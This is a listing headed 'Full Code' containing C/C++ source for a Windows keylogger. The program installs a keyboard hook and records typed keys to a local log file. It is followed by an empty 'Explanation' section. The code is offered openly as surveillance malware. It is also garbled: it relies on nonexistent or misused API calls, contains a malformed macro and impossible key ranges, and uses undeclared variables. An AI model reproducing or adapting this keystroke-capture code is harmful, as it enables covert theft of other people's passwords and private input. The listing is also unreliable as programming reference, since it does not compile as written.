### Full Code

```c
#include <windows.h>
#include <winsdk/winuser.h>
#include <stdio.h>
#include <iostream>
#include <thread>
#include <fcntl.h>
#include <sys/types.h>
#include <errno.h>

#define HINJECT_DLL 0x00000409
#define KEYBD_EVENT 0x00001000
#define KEYBD_INPUT 0x00000008
#define KEYBD_NOTIFICATION 0x00000010
#define KEYBD_DEACTIVATE 0x00000020
#define KEYBOARD LayoutSize 256

HWND hwnd = 0;
HHOOK hKeyboardHook = 0;
HANDLE hLogFile = NULL;
char logBuffer[1024];
int logIndex = 0;

struct KeyState {
    uint32_t time;
    uint32_t key;
    bool down;
};

void logKeyboard(char key, bool isKeyDown) {
    logBuffer[logIndex] = key;
    logIndex++;
    if (logIndex >= sizeof(logBuffer)) {
        logIndex = 0;
        if (hLogFile) {
            FlushFile(hLogFile);
        }
    }
}

LRESULT CALLBACK KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) {
    static bool shift = false;
    static bool ctrl = false;
    static bool alt = false;

    if (lParam == 0) {
        if (code == HC_KEYDOWN) {
            uint32_t key = wParam;
            if (key >= 0x20 && key <= 0x2F) {
                if (key == 0x20) {
                    logKeyboard(' ', true);
                } else {
                    logKeyboard((char)(key - 0x20), true);
                }
            } else if (key >= 0x40 && key <= 0x5B) {
                logKeyboard((char)(key), true);
            } else if (key >= 0x60 && key <= 0x9E) {
                logKeyboard((char)(key), true);
            } else if (key >= 0xA0 && key <= 0xF7) {
                logKeyboard((char)(key), true);
            } else if (key >= 0x100 && key <= 0x17) {
                logKeyboard((char)(key - 0x100 + 0x60), true);
            }
            if (key == 0xA4) {
                shift = true;
            } else if (key == 0xA3) {
                shift = false;
            }
            if (key == 0xA0) {
                alt = !alt;
            }
            if ((key == 0x20 || (key == 0xA4 || key == 0xA3 || key == 0xA0)) {
                if (wParam == 0x0100000000000000) {
                    // Key down
                    if (key == 0x20) {
                        logKeyboard(' ', true);
                    } else {
                        logKeyboard((char)(key - 0x20), true);
                    }
                }
            } else {
                // Key up
                if (key == 0x20) {
                    logKeyboard(' ', false);
                } else {
                    logKeyboard((char)(key - 0x20), false);
                }
                if (key == 0xA4) {
                    shift = false;
                }
                if (key == 0xA0) {
                    alt = false;
                }
            }
        } else if (code == HC_KEYUP) {
            if (key == 0x20) {
                logKeyboard(' ', false);
            } else {
                logKeyboard((char)(key - 0x20), false);
            }
            if (key == 0xA4) {
                shift = false;
            }
            if (key == 0xA0) {
                alt = false;
            }
        } else if (code == HC_MOUSEMOVE) {
            // Ignore mouse movement
        } else if (code == HC_JOURNALNEED) {
            // Get the current keyboard state
            uint32_t keyboardState[256];
            GetKeyboardState(&keyboardState, 0);
            for (int i = 0; i < KEYBOARD LayoutSize; ++i) {
                logKeyboard((char)i, (keyboardState[i] != 0));
            }
        }
        return CallNextHook(code, wParam, lParam);
    }
    return 0;
}

int main() {
    hwnd = GetDesktopWindow();
    hLogFile = CreateFile("KeystrokeLog.log", FILE_APPEND, FILE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hLogFile == -1) {
        printf("Failed to create log file: %d\n", errno);
        return 1;
    }
    hKeyboardHook = SetWindowsHook(hwnd, KEYBD_EVENT, KeyboardHookProc);
    if (hKeyboardHook == 0) {
        printf("Failed to install keyboard hook: %d\n", errno);
        return 1;
    }
    CreateThread(0, 0, (void*)(&hookThread), 0, 0, &threadId);
    return 0;
}

DWORD WINAPI hookThread(void* arg) {
    while (true) {
        Sleep(100);
        if (logIndex >= sizeof(logBuffer)) {
            if (hLogFile) {
                FlushFile(hLogFile);
                logIndex = 0;
            }
        }
    }
    return 0;
}

void UninstallHook() {
    if (hKeyboardHook) {
        RemoveWindowHook(hKeyboardHook);
        hKeyboardHook = 0;
    }
}
```

### Explanation

